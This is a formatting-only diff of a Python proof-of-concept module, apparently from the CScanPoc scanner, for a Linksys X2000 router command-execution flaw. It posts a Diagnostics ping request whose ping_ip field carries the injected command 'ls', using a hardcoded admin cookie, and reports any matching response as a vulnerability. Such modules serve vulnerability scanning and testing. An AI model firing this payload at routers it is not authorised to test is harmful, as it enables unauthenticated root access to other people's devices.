@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Linksys_0001' # 平台漏洞编号，留空
+    vuln_id = 'Linksys_0001'  # 平台漏洞编号，留空
     name = 'Linksys X2000 Command Execution'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2015-11-03'  # 漏洞公布时间
     desc = '''
         The Linksys X2000 suffers from a remote, unauthenticated command execution vulnerability that scores root privileges.
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Linksys'  # 漏洞应用名称
     product_version = 'X2000'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '42e4fb99-4f1d-47fe-bc7d-e9f3268b4e2a'
@@ -30,13 +32,14 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             data = 'submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&nowait=1&ping_size=32&ping_times=5&ping_ip=ls'
             url = self.target + '/apply.cgi'
-            code, head, res, errcode, _ = hh.http(url, data, Cookie= 'wys_userid=admin,wys_passwd=5982861B34B74E9A6DAD66A9895CDFFF')
+            code, head, res, errcode, _ = hh.http(
+                url, data, Cookie='wys_userid=admin,wys_passwd=5982861B34B74E9A6DAD66A9895CDFFF')
 
-            if 'X2000'  in res and 'You must input an IP Address or Domain Name' in res:
+            if 'X2000' in res and 'You must input an IP Address or Domain Name' in res:
                 #security_hole('Linksys X2000 Command Execution AND Unauthorized access!')
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -46,6 +49,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
